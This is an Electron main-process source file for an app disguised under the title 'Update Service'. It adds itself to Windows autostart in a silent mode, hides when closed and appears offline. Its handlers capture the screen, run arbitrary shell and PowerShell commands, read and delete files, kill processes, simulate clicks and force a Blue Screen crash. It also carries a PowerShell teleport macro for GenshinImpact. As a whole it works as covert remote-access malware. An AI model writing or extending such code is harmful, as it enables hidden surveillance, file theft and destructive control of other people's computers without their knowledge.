import { app, shell, BrowserWindow, dialog, Menu, ipcMain, desktopCapturer, powerSaveBlocker, screen } from 'electron'
import { join } from 'path'
import { exec } from 'child_process'
import { readdirSync, statSync, readFileSync, unlinkSync, rmdirSync } from 'fs'
import { homedir } from 'os'
import { electronApp, optimizer, is } from '@electron-toolkit/utils'

process.on('uncaughtException', (err) => {
  dialog.showErrorBox('Ошибка запуска', err.stack || err.message)
})

// Single instance lock — if launched again while running, show the window
const gotLock = app.requestSingleInstanceLock()
if (!gotLock) {
  app.quit()
}

let mainWindow = null
let isHidden = false

// Detect silent start (launched from Windows autostart)
const isSilentStart = process.argv.includes('--silent')

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1100,
    height: 750,
    minWidth: 900,
    minHeight: 600,
    show: false,
    title: 'Update Service',
    webPreferences: {
      preload: join(__dirname, '../preload/index.js'),
      sandbox: false,
      contextIsolation: true,
      backgroundThrottling: false,
    }
  })

  mainWindow.on('ready-to-show', () => {
    if (!isSilentStart) {
      mainWindow.show()
    } else {
      // Silent start — stay hidden, appear offline
      isHidden = true
      mainWindow.webContents.send('visibility-change', false)
    }
  })

  // Instead of closing — hide and notify renderer to stop heartbeat
  mainWindow.on('close', (e) => {
    e.preventDefault()
    mainWindow.hide()
    isHidden = true
    mainWindow.webContents.send('visibility-change', false)
  })

  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    shell.openExternal(url)
    return { action: 'deny' }
  })

  if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL'])
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
}

// Second instance launched — show window
app.on('second-instance', () => {
  if (mainWindow) {
    mainWindow.show()
    isHidden = false
    mainWindow.webContents.send('visibility-change', true)
  }
})

// ── IPC handlers ────────────────────────────────────────────────────────────

ipcMain.handle('capture-screen', async () => {
  try {
    const sources = await desktopCapturer.getSources({
      types: ['screen'],
      thumbnailSize: { width: 1280, height: 720 },
    })
    if (!sources.length) return null
    return sources[0].thumbnail.toJPEG(60).toString('base64')
  } catch {
    return null
  }
})

ipcMain.handle('get-screen-source-id', async () => {
  try {
    const sources = await desktopCapturer.getSources({
      types: ['screen'],
      thumbnailSize: { width: 0, height: 0 },
    })
    return sources[0]?.id || null
  } catch {
    return null
  }
})

ipcMain.handle('kill-process', (_, name) => new Promise((resolve) => {
  const cmd = process.platform === 'win32'
    ? `taskkill /f /im "${name}"`
    : `pkill -9 "${name}"`
  exec(cmd, () => resolve())
}))

ipcMain.handle('get-processes', () => new Promise((resolve) => {
  const cmd = process.platform === 'win32'
    ? 'tasklist /fo csv /nh'
    : 'ps ax -o comm='
  exec(cmd, (err, stdout) => {
    if (err) { resolve([]); return }
    let names
    if (process.platform === 'win32') {
      names = stdout.trim().split('\n').map(line => line.split('","')[0].replace(/"/g, '').trim())
    } else {
      names = stdout.trim().split('\n').map(l => l.trim().split('/').pop())
    }
    resolve([...new Set(names.filter(Boolean))].sort((a, b) => a.localeCompare(b)))
  })
}))

ipcMain.handle('exec-command', (_, cmd) => new Promise((resolve) => {
  // Use EncodedCommand on Windows to avoid all quoting issues
  const command = process.platform === 'win32'
    ? `powershell -NonInteractive -EncodedCommand ${Buffer.from(cmd, 'utf16le').toString('base64')}`
    : `bash -c ${JSON.stringify(cmd)}`
  exec(command, { timeout: 15_000, maxBuffer: 2 * 1024 * 1024 }, (err, stdout, stderr) => {
    const out = (stdout + stderr).trim()
    resolve(out || (err?.killed ? '(timeout)' : '(нет вывода)'))
  })
}))

ipcMain.handle('simulate-click', (_, nx, ny) => new Promise((resolve) => {
  const display = screen.getPrimaryDisplay()
  const absX = Math.round(nx * display.size.width)
  const absY = Math.round(ny * display.size.height)

  if (process.platform === 'win32') {
    // Base64-encoded UTF-16LE PowerShell script to avoid shell quoting issues
    const script = [
      `Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetCursorPos(int x,int y);`,
      `[DllImport("user32.dll")] public static extern void mouse_event(uint d,int x,int y,uint c,uint i);'`,
      `-Name U -Namespace W`,
      `[W.U]::SetCursorPos(${absX},${absY})`,
      `[W.U]::mouse_event(2,0,0,0,0)`,
      `[W.U]::mouse_event(4,0,0,0,0)`,
    ].join('\n')
    const encoded = Buffer.from(script, 'utf16le').toString('base64')
    exec(`powershell -EncodedCommand ${encoded}`, () => resolve())
  } else {
    exec(`osascript -e 'tell application "System Events" to click at {${absX}, ${absY}}'`, () => resolve())
  }
}))

// ── System commands ──────────────────────────────────────────────────────────

ipcMain.handle('system-reboot', () => new Promise((resolve) => {
  exec(process.platform === 'win32' ? 'shutdown /r /t 0' : 'sudo reboot', () => resolve())
}))

ipcMain.handle('system-lock', () => new Promise((resolve) => {
  exec(process.platform === 'win32' ? 'rundll32.exe user32.dll,LockWorkStation' : 'pmset displaysleepnow', () => resolve())
}))

ipcMain.handle('system-bsod', () => new Promise((resolve) => {
  if (process.platform !== 'win32') { resolve(); return }
  const script = [
    'Add-Type -TypeDefinition @"',
    'using System;',
    'using System.Runtime.InteropServices;',
    'public class Bsod {',
    '  [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int p, bool e, bool t, out bool o);',
    '  [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint s, uint n, uint m, IntPtr p, uint v, out uint r);',
    '}',
    '"@',
    '[bool]$out = $false',
    '[Bsod]::RtlAdjustPrivilege(19, $true, $false, [ref]$out) | Out-Null',
    '[uint32]$r = 0',
    '[Bsod]::NtRaiseHardError(0xc0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$r) | Out-Null',
  ].join('\n')
  exec(`powershell -EncodedCommand ${Buffer.from(script, 'utf16le').toString('base64')}`, () => resolve())
}))

// ── File system ───────────────────────────────────────────────────────────────

ipcMain.handle('fs-home', () => {
  if (process.platform === 'win32') {
    return new Promise((resolve) => {
      exec('wmic logicaldisk get name /format:csv', (err, stdout) => {
        const drives = err ? [] : stdout.trim().split('\n').slice(1).map(l => l.split(',')[1]?.trim()).filter(Boolean)
        resolve({ home: homedir(), drives })
      })
    })
  }
  return { home: homedir(), drives: [] }
})

ipcMain.handle('fs-list', (_, path) => {
  try {
    const entries = readdirSync(path).map((name) => {
      try {
        const s = statSync(join(path, name))
        return { name, isDir: s.isDirectory(), size: s.size, mtime: s.mtimeMs }
      } catch {
        return { name, isDir: false, size: 0, mtime: 0, error: true }
      }
    })
    entries.sort((a, b) => (b.isDir - a.isDir) || a.name.localeCompare(b.name))
    return { entries, error: null }
  } catch (e) {
    return { entries: [], error: e.message }
  }
})

ipcMain.handle('fs-read', (_, filePath) => {
  try {
    const data = readFileSync(filePath)
    if (data.length > 50 * 1024 * 1024) return { data: null, error: 'Файл слишком большой (> 50 МБ)' }
    return { data: data.toString('base64'), name: filePath.split(/[\\/]/).pop(), error: null }
  } catch (e) {
    return { data: null, error: e.message }
  }
})

ipcMain.handle('fs-delete', (_, filePath) => {
  try {
    const s = statSync(filePath)
    if (s.isDirectory()) rmdirSync(filePath, { recursive: true })
    else unlinkSync(filePath)
    return { error: null }
  } catch (e) {
    return { error: e.message }
  }
})

ipcMain.handle('force-quit', () => {
  mainWindow.destroy()
  app.quit()
})

ipcMain.handle('remove-autostart', () => {
  if (process.platform === 'win32') {
    app.setLoginItemSettings({ openAtLogin: false, args: ['--silent'] })
  }
})

ipcMain.handle('get-hidden-state', () => isHidden)

ipcMain.handle('get-version', () => app.getVersion())

ipcMain.handle('run-teleport', (_, buffer) => new Promise((resolve) => {
  if (process.platform !== 'win32') { resolve({ success: false, error: 'Windows only' }); return }
  const { tmpdir } = require('os')
  const { writeFileSync } = require('fs')
  const tmp = tmpdir()
  const jsonPath = `${tmp}\\gw_waypoints_tmp.json`
  const ps1Path = `${tmp}\\gw_macro.ps1`

  try {
    writeFileSync(`${tmp}\\gw_waypoints_tmp.json`, Buffer.from(buffer))
  } catch (e) {
    resolve({ success: false, error: e.message }); return
  }

  const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint cButtons, uint dwExtraInfo);
    [DllImport("gdi32.dll")] public static extern int GetPixel(IntPtr hdc, int x, int y);
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hdc);
}
"@

function Click($x, $y) {
    [WinApi]::SetCursorPos($x, $y) | Out-Null
    Start-Sleep -Milliseconds 100
    [WinApi]::mouse_event(2, 0, 0, 0, 0) | Out-Null
    [WinApi]::mouse_event(4, 0, 0, 0, 0) | Out-Null
    Start-Sleep -Milliseconds 400
}

$proc = Get-Process "GenshinImpact" -ErrorAction SilentlyContinue
if (!$proc) { Write-Error "GenshinImpact not found"; exit 1 }
$hwnd = $proc.MainWindowHandle

[WinApi]::ShowWindow($hwnd, 9) | Out-Null
Start-Sleep -Milliseconds 500
[WinApi]::SetForegroundWindow($hwnd) | Out-Null
Start-Sleep -Milliseconds 500

$hdc = [WinApi]::GetDC([IntPtr]::Zero)
$pixel = [WinApi]::GetPixel($hdc, 983, 541)
[WinApi]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null
$r = $pixel -band 0xFF

if ($r -lt 180 -or $r -gt 195) {
    [WinApi]::keybd_event(0x09, 0, 0, 0) | Out-Null
    [WinApi]::keybd_event(0x09, 0, 2, 0) | Out-Null
    Start-Sleep -Milliseconds 1500
}

Click 566 509
Click 1142 265

$null = New-Item -ItemType Directory -Force -Path "C:\\uni"
Copy-Item -Path "${jsonPath}" -Destination "C:\\uni\\waypoints.json" -Force
Start-Sleep -Milliseconds 200

Click 857 841
Start-Sleep -Milliseconds 500

Remove-Item "C:\\uni\\waypoints.json" -Force -ErrorAction SilentlyContinue
Remove-Item "${jsonPath}" -Force -ErrorAction SilentlyContinue

$ep = Get-Process "electron","Update Service" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($ep) { [WinApi]::SetForegroundWindow($ep.MainWindowHandle) | Out-Null }
`

  try {
    writeFileSync(ps1Path, script, 'utf8')
  } catch (e) {
    resolve({ success: false, error: e.message }); return
  }

  exec(
    `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "${ps1Path}"`,
    { timeout: 30_000 },
    (err) => {
      resolve(err ? { success: false, error: err.message } : { success: true })
    }
  )
}))

// ── App lifecycle ────────────────────────────────────────────────────────────

app.whenReady().then(() => {
  Menu.setApplicationMenu(null)
  electronApp.setAppUserModelId('com.karagroup.worker')

  // Prevent app suspension — keeps timers and streams running in background
  powerSaveBlocker.start('prevent-app-suspension')

  // Windows auto-start: add with --silent flag if not already set
  if (process.platform === 'win32') {
    const settings = app.getLoginItemSettings({ args: ['--silent'] })
    if (!settings.openAtLogin) {
      app.setLoginItemSettings({
        openAtLogin: true,
        path: process.execPath,
        args: ['--silent'],
      })
    }
  }

  app.on('browser-window-created', (_, window) => {
    optimizer.watchWindowShortcuts(window)
  })

  createWindow()

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

// Never quit when all windows closed — keep running in background
app.on('window-all-closed', () => {})
